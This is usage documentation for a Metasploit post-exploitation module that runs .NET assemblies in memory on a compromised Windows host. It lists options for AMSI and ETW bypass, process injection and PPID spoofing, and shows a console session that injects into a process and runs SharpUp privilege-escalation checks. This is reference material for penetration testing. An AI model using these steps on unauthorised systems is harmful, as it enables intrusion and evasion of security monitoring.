https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/manage/execute_dotnet_assembly.md
```

       Name: Execute .net Assembly (x64 only)
     Module: post/windows/manage/execute_dotnet_assembly
   Platform: Windows
       Arch: x64
       Rank: Normal

Description:
  This module executes a .NET assembly in memory. It
  reflectively loads a dll that will host CLR, then it copies
  the assembly to be executed into memory. Credits for AMSI
  bypass to Rastamouse (@_RastaMouse)
```


# Usage

```
meterpreter > background 

msf6 exploit(multi/handler) > use windows/manage/execute_dotnet_assembly

msf6 post(windows/manage/execute_dotnet_assembly) > options 
Module options (post/windows/manage/execute_dotnet_assembly):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   AMSIBYPASS  true             yes       Enable AMSI bypass
   ARGUMENTS                    no        Command line arguments
   DOTNET_EXE                   yes       Assembly file name
   ETWBYPASS   true             yes       Enable ETW bypass
   SESSION                      yes       The session to run this module on
   TECHNIQUE   SELF             yes       Technique for executing assembly (Accepted: SELF, INJECT, SPAWN_AND_INJECT)


   When TECHNIQUE is SPAWN_AND_INJECT:

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   PPID                             no        Process Identifier for PPID spoofing when creating a new process (no PPID spoofing if unset)
   PROCESS         notepad.exe      no        Process to spawn
   USETHREADTOKEN  true             no        Spawn process using the current thread impersonation


   When TECHNIQUE is INJECT:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   PID                    no        PID to inject into



```


# Techniques

Metasploits implementation of execute-assembly allows you to run .NET in 3 different ways. They are defined under:
```
- INJECT - Inject into another running process
- SELF - Run inside of meterpreters current process
- SPAWN_AND_INJECT - Spawn a process and inject into it
```

It is up to you to decide which is best for your current situation.

# SPAWN_AND_INJECT
```
msf6 post(windows/manage/execute_dotnet_assembly) > set dotnet_exe /exe/SharpUp.exe
dotnet_exe => /exe/SharpUp.exe

msf6 post(windows/manage/execute_dotnet_assembly) > set arguments audit
arguments => audit

msf6 post(windows/manage/execute_dotnet_assembly) > set session 1 
session => 1

msf6 post(windows/manage/execute_dotnet_assembly) > run

[*] Running module against DESKTOP-99218I9
[*] Opening handle to process 8900...
[+] Handle opened
[*] Reflectively injecting the Host DLL into 8900..
[*] Injecting Host into 8900...
[*] Host injected. Copy assembly into 8900...
[*] Assembly copied.
[*] Executing...
[*] Start reading output
[*] Writing output to.....

=== SharpUp: Running Privilege Escalation Checks ===
[+] Potenatially Hijackable DLL: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\ApiClient.dll
[!] Files in C:\Program Files and C:\Program Files (x86) may be false positives. Permissions should be verified manually.
[+] Associated Process is OfficeClickToRun with PID 2032
[+] Potenatially Hijackable DLL: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\StreamServer.dll
[!] Files in C:\Program Files and C:\Program Files (x86) may be false positives. Permissions should be verified manually.
[+] Associated Process is OfficeClickToRun with PID 2032
[+] Potenatially Hijackable DLL: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\AppVIsvApi.dll
[!] Files in C:\Program Files and C:\Program Files (x86) may be false positives. Permissions should be verified manually.
[+] Associated Process is OfficeClickToRun with PID 2032
[+] Potenatially Hijackable DLL: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\APPVPOLICY.dll
[!] Files in C:\Program Files and C:\Program Files (x86) may be false positives. Permissions should be verified manually.
[+] Associated Process is OfficeClickToRun with PID 2032
[+] Potenatially Hijackable DLL: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\MSVCP120.dll
[!] Files in C:\Program Files and C:\Program Files (x86) may be false positives. Permissions should be verified manually.
.....
....
...

```

